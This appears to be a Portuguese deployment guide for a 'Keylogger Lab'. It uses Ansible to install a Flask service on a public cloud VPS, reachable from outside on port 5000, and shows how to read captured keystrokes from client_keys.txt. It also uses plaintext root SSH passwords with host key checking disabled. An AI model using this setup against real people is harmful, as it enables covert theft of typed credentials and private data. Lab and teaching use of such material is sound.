# Guia de Deploy - Keylogger Lab

## Requisitos do Servidor Destino

- Sistema: **Debian** ou **Ubuntu**
- Acesso: **SSH com root** (ou sudo)
- Portas: **22** (SSH) e **5000** (Flask) liberadas no firewall do cloud

---

## Passo 1: Instalar Ansible (na sua maquina local)

```bash
# Windows (via pip)
pip install ansible

# Linux/Mac
pip install ansible
# ou
apt install ansible  # Debian/Ubuntu
brew install ansible # Mac
```

---

## Passo 2: Configurar o Servidor Destino

Edite o arquivo `inventory.ini` e altere **apenas estas 3 linhas**:

```ini
[keylogger_servers]
meu-servidor ansible_host=SEU_IP_AQUI

[keylogger_servers:vars]
ansible_user=root
ansible_password=SUA_SENHA_AQUI
ansible_ssh_common_args='-o StrictHostKeyChecking=no'
ansible_python_interpreter=/usr/bin/python3
```

### Valores para alterar:

| Variavel | O que colocar | Exemplo |
|----------|---------------|---------|
| `ansible_host` | IP publico do servidor | `192.168.1.100` |
| `ansible_user` | Usuario SSH | `root` ou `ubuntu` |
| `ansible_password` | Senha SSH | `MinhaSenh@123` |

### Exemplo preenchido:

```ini
[keylogger_servers]
meu-servidor ansible_host=45.79.123.456

[keylogger_servers:vars]
ansible_user=root
ansible_password=Senh@Segura789!
ansible_ssh_common_args='-o StrictHostKeyChecking=no'
ansible_python_interpreter=/usr/bin/python3
```

---

## Passo 3: (Opcional) Alterar Configuracoes do Playbook

Se quiser mudar porta ou diretorio, edite `playbook.yml`:

```yaml
vars:
  project_dir: /opt/keylogger-lab  # Onde instalar
  flask_port: 5000                  # Porta do servidor web
  flask_host: "0.0.0.0"             # Interface (0.0.0.0 = todas)
```

| Variavel | Padrao | Descricao |
|----------|--------|-----------|
| `project_dir` | `/opt/keylogger-lab` | Pasta de instalacao |
| `flask_port` | `5000` | Porta HTTP do Flask |
| `flask_host` | `0.0.0.0` | `0.0.0.0` = acessivel externamente |

---

## Passo 4: Executar o Deploy

```bash
cd ansible
ansible-playbook -i inventory.ini playbook.yml
```

### Saida esperada:

```
PLAY [Deploy Keylogger Lab Infrastructure] *****

TASK [Atualizar cache do apt] ******************
ok: [meu-servidor]

TASK [Instalar pacotes do sistema] *************
changed: [meu-servidor]

...

PLAY RECAP *************************************
meu-servidor : ok=15  changed=12  failed=0
```

---

## Passo 5: Verificar se Funcionou

Acesse no navegador:

```
http://SEU_IP:5000
```

Deve aparecer a pagina de cadastro.

---

## Comandos Uteis (no servidor)

```bash
# Ver se esta rodando
systemctl status keylogger-lab

# Ver logs em tempo real
journalctl -u keylogger-lab -f

# Reiniciar
systemctl restart keylogger-lab

# Parar
systemctl stop keylogger-lab

# Ver teclas capturadas
cat /opt/keylogger-lab/backend/client_keys.txt
```

---

## Resumo Rapido

```
1. Editar inventory.ini:
   - ansible_host = IP do servidor
   - ansible_password = senha SSH

2. Rodar:
   ansible-playbook -i inventory.ini playbook.yml

3. Acessar:
   http://IP:5000
```

---

## Troubleshooting

| Erro | Solucao |
|------|---------|
| `Connection refused` | Verificar se porta 22 esta aberta |
| `Authentication failed` | Verificar usuario e senha no inventory |
| `Pagina nao abre` | Verificar se porta 5000 esta liberada no firewall do cloud |
| `pip not found` | Ansible vai instalar, mas servidor precisa de acesso a internet |

---

## Provedores Cloud Testados

- Linode
- DigitalOcean
- AWS EC2
- Vultr
- Azure VM

Qualquer VPS com Debian/Ubuntu e acesso root funciona.
